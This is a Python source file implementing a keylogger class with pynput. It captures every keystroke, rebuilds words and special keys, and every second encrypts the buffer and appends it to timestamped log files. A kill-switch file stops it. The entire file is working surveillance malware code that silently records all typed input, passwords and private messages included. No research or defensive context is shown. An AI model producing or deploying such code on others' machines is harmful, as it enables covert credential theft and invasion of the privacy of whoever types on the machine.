from pynput import keyboard
from logger.encryptor import Encryptor
from utils.config import LOG_DIR, KILL_SWITCH_FILE
import os
import time
from datetime import datetime
import threading

class KeyLogger:
    def __init__(self):
        self.encryptor = Encryptor()
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_path = os.path.join(LOG_DIR, f"log_{timestamp}.enc")
        self.buffer = []
        self.word = ""
        self.lock = threading.Lock()

    def on_press(self, key):
        try:
            with self.lock:
                if key == keyboard.Key.space:
                    self.buffer.append(self.word)
                    self.buffer.append(" ")
                    self.word = ""
                elif key == keyboard.Key.enter:
                    self.buffer.append(self.word)
                    self.buffer.append("<ENTER>\n")
                    self.word = ""
                elif key == keyboard.Key.backspace:
                    self.word = self.word[:-1]
                elif hasattr(key, 'char') and key.char is not None:
                    self.word += key.char
                else:
                    self.buffer.append(f"<{key.name.upper()}>")
        except Exception as e:
            print(f"[!] Error capturing key: {e}")

    def flush_buffer(self):
        while True:
            if os.path.exists(KILL_SWITCH_FILE):
                print("[*] Kill switch detected. Exiting logger.")
                exit(0)

            with self.lock:
                if self.buffer:
                    text = ''.join(self.buffer)
                    encrypted = self.encryptor.encrypt(text)
                    with open(self.log_path, "ab") as f:
                        f.write(encrypted + b"\n")
                    self.buffer.clear()

            time.sleep(1)

    def start(self):
        flush_thread = threading.Thread(target=self.flush_buffer, daemon=True)
        flush_thread.start()

        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()
